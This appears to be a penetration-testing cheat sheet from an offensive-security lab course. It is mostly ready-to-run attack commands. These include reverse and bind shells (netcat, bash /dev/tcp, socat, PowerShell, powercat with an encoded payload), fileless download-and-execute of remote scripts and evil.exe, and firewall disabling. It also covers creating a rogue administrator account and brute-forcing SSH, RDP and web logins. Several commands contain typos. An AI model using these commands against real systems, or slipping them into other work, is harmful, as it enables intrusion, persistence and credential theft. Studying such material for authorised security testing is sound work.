## Nmap Scan

Launch nmap scan

```
nmap -sC -sV -A -Pn -p- -oA nmap example.com
nmap -sC -sV -Pn --top-ports=20 -oA nmap-top-20 example.com
sudo nmap -O example.com
```

Find nse scripts 

`ls /usr/share/nmap/scripts/|grep svn`

Get help for particular nse script

`nmap --script-help svn-brute.nse`

## File Transfer

* Transfering files with SCP

```
// scp upload file/folder
scp -r local.txt host:/path/to/dest

// scp download file/folder
scp -r host:/path/to/remote.txt remote.txt
```
* Using Socat to transfer files

```
// listen and spawn child process on connect
socat TCP4-LISTEN:1443,fork file:secret_passwords.txt

// connect and create new file
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

//encrypted shells require pem certificate
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt && cat bind_shell.key bind_shell.crt > bind_shell.pem

// listener
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin
/bash

// connector
socat - OPENSSL:10.11.0.4:443,verify=0
```

* PowerShell File Transfers

```
powershell Invoke-Webrequest -Uri http://10.10.14.74:4757/nc64.exe -OutFile C:\Data\Users\DefaultAccount\AppData\Local\Temp\nc64.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

Download and run powershell script without saving it to the victim hard disk.

```
powershell.exe IEX (New-Object System.Net,WebClient),DownloadString('
http://10.11.15.15/helloworld.ps1')
```

* Powercat file transfer

```
// connect to host and transfer local file powercat.ps1
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1

sudo nc -lnvp 443 > receiving_powercat.ps1
```

* FTP file transfer

```
// install ftp server on linux
sudo apt update && sudo apt install pure-ftpd
sudo systemctl restart pure-ftpd

//transfer files
ftp -v -n -s:ftp.txt

// create ftp.txt
echo open 10.11.0.21> ftp.txt
echo USER offsec>> ftp.txt
echo password>> ftp.txt
echo bin>> ftp.txt
echo GET nc.exe >> ftp.t xt
echo bye >> ftp.txt
```

* VBScript HTTP downloader script

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget. vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter , fs, ts>> wget.vbs
echo Err.Clear>> wget.vbs
echo Set http= Nothing>> wget.vbs
echo Set http = CreateObject( "WinHttp.WinHttpRequest.5.1")>> wget.vbs
echo If http Is Nothing Then Set http=CreateObject("WinHttp.WinHttpRequest")>> wge
t.vbs
echo If http Is Nothing Then Set http=Create0bject( "MSXML2.ServerXMLHTTP" ) >> wget.vbs
echo If http Is Nothing Then Set http=CreateObject( "Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET" , strURL, False>> wget.vbs
echo http.Send>> wget.vbs
echo var ByteArray = http.ResponseBody >>wget.vbs
echo Set http= Nothing>> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject" ) >>wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget. vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next>> wget.vbs
echo ts.Close>> wget.vbs
```

Using downloader to download files

```
C:\Users\Offsec> cscript wget.vbs http://10.11.15.56/evil.exe evil.exe
```

* converting exe to hex and using powershell commands to build the exe back

```
// PE compression tool to compress the file
upx -9 nc.exe

// convert the exe to hex
exe2hex -x nc.exe -p nc.cmd

// copy commands from nc.cmd to clipboard
cat nc.cmd | xclip -selection clipboard

// paste the commands to build nc.exe back on windows
```

* TFTP to upload files from windows

```
C:\Users\Offsec> tftp -i 10.11.8.4 put important.docx

// create tftp daemon on linux
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

## Directory Brute Force

Dirsearch for brute forcing file system

`./dirsearch.py -r -e old,new,txt,asp,aspx,jsp,jspx,bak,gz,zip,tar,7z,php,htm,html,bat,sh,do -b --random-agents --plain-text-report=dirsearch.out -u url -w wordlist(optional)`

FFuf to fuzz content

`ffuf -w content_discovery_all.txt -u http://host/ -o dirfuzz.txt -of md -timeout 30 -ac -s -t 20 -se`

Dirb

```
dirb http://www.megacorpone.com
```

## Virtual Host Discovery

`ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242`

## SSH Port Forwarding

```
ssh -N -L vps-ip:8080:10.10.10.203:80 vps_ip
ssh -N -R vps-ip:8080:localhost:80 user@htb-ip
ssh -N -D 127.0.0.1:8080 student@10.11.8.128
```

## SVN commands

```
svn checkout svn://host
svn log
svn update -r r5
```

Dump repo content

`svnrdump dump svn://host`


## Github Commands

```
git log --oneline
git reset 9ef9173
git reset current~2 (using a relative value -2 before the "current" tag)
```

## Searching File System 

```
Find <location> -name <to find>
eg: find / -name ettercap
```

```
locate filename  --> to locate anything
updatebd --> to update local database
```

## Enumerate running services and ports

```
netstat -antp --> running services and ports
```

## Bind and Reverse Shells

* Netcat Shells

```
nc -nv 192.168.145.129 4444 -e /bin/bash 2> /tmp/error_log 
nc -nlvp 4444 

ncat is similar to nc but also supports ssl for encryption

ncat -nlvp 4444 --ssl --allow <ip>
ncat -nv <ip_to_connect> 4444
```

* SBD shells

```
sbd -lp 4444 -k secret -e /bin/bash
sbd -k secret 127.0.0.1 4444
```

* Bash Shell

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.74/4757 0>&1"
```


* Socat Shells

```
// create an IPv4 listener on port 443, and connect STDOUT to the TCP socket
socat TCP4-LISTEN:1443 STDOUT

// connect to remote host and execute /bin/bash
socat TCP4:10.11.0.22:443 EXEC:/bin/bash

// encrypted shell requires pem certificate
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt && cat bind_shell.key bind_shell.crt > bind_shell.pem

// listener
socat OPENSSL-LISTEN:1443,cert=bind_shell.pem,verify=0,fork EXEC:/bin
/bash

// connector
socat - OPENSSL:10.11.0.4:443,verify=0
```

* Powershell shells

```
// reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

// bind shell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

* Powercat shell

```
// reverse shell
powercat -c 10.11.0.4 -p 443 -e cmd.exe
sudo nc -lvp 443

// bind shell
powercat -l -p 443 -e cmd.exe
nc 10.11.0.22 443

// generate base64 encoded reverse shell command
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1

// needs to pass the whole
encoded string to powershell.exe
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM
AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBt
```


## Firewall Commands

Disable firewall

```
ufw disable
```

## Comparing Files

```
// compare sorted files
comm scan-a.txt scan-b.txt

// return only the lines that were found in both files
comm -12 scan-a.txt scan-b.txt
```

```
diff -c scan-a.txt scan-b.txt

// unified format does not show lines that match between files
diff -u scan-a.txt scan-b.txt
```

```
vimdiff scan-a.txt scan-b.txt

do : gets changes from the other window into the current one
dp : puts the changes from the current window into the other one
]c : jumps to the next change
[c : jumps to the previous change
```


## Zone Transfer

```
dnsrecon -d megacorpone.com -t axfr
dnsenum zonetransfer.me
```

## iptables rule

```
// Insert inbound rule #1 to accept all connections from source
sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT

// Insert outbound rule #1 to allow connections to destination
sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT

// zero the packet and byte counters in all chains.
sudo iptables-z
```

## SMB Enumeration

```
sudo nbtscan -r 10.11.1.0/24
ls -1 /usr/share/nmap/scripts/smb*
```

## RPCbind

Runs on port 111 and maps RPC services to the their listening ports.

```
nmap -sV -p 111 --script=rpcinfo 10.02.32.15
```

## NFS

```
shownount 10.11.1.12
nmap -p 111 --script nfs* 10.11.1.12
```

## SNMP

```
// try default public, private and manager community strings 
onesixtyone - c community.txt -i ips.txt
onesixtyone 192.168.4.0/24 public

// snmpwalk enumerate full MIB tree (v1,2c,3)
snmpwalk -c public -v1 -t 10 10.11.1.14

// enumerate only users, process, etc
snmpwalk -c public -v1 10.11.1.14 <MIB-Value>
```

MIB Values

```
1.3.6.1 .2.1 .25.1.6.0	- System Processes
1.3.6.1 .2.1.25.4.2.1.4	- Processes Path
1.3.6.1.2.1.25.4.2.1.2	- Running Programs
1.3.6.1.2.1.6.13.1.3	- TCP Local Ports
1.3.6.1.4.1.77.1.2.25	- User Accounts
1.3.6.1.2.1.25.6.3.1.2	- Software Name
1.3.6.1.2.1.25.2.3.1.4	- Storage Units
```

## Powershell commands

```
// temporarily allow unsigned scripts to execute
powershell -ExecutionPolicy Bypass -File admin_login.ps1

// decrypt securestring exported to xml file
powershell -c "$credential = Import-CliXml -Path c:\creds.xml;$credential.GetNetworkCredential().Password"
```

## Running local http servers

```
python -m SimpteHTTPServer 7331
python3 -m http.server 7331
php -S 0.0.0.0:8888
ruby -run -e httpd . -p 9008
busybox httpd -f -p 18880
```

## Upgrading a Non-Interactive Shell

```
python -c 'import pty; pty.spawn("/bin/bash") '
bash -i 2>&1
```

## Powershell to cmd

```
Start-Process cmd.exe
Start-Process cmd.exe -verb runAs
```

## Create windows admin user

```
net user evil Ev!lpass /add
net localgroup administrators evil /add
```

## Password Attacks

```
cewl www.megacorpone.com -m 6 -w megacorp-cewt.txt

// htaccess Attack with Medusa
medusa -h 10.11.8.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin

// RDP brute force
crowbar -b rdp -s 10.11.8.22/32 -u admin -C ~/password-file.txt -n 1

// ssh attack with hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1

// http-post login brute force
hydra 10.11.8.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f

// cracking hash - hash.txt format should be user:pass
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT

// Crack linux password hash
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordtists/rockyou.txt unshadowed.txt
```